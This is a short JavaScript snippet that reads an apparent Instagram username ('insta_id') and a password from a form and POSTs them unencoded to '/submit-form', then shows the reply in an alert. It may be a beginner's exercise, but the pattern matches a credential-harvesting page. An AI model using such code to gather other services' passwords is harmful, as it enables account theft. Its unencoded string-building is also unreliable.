function submitForm(){
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        alert(this.responseText);      }
    };
    xhttp.open("POST", "/submit-form", true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhttp.send(getem());
  }
  
  function getem(){
    var ids = document.getElementById("insta_id").value
    var password = document.getElementById("pass").value
    return "id ="+ids+"&password ="+password;
  }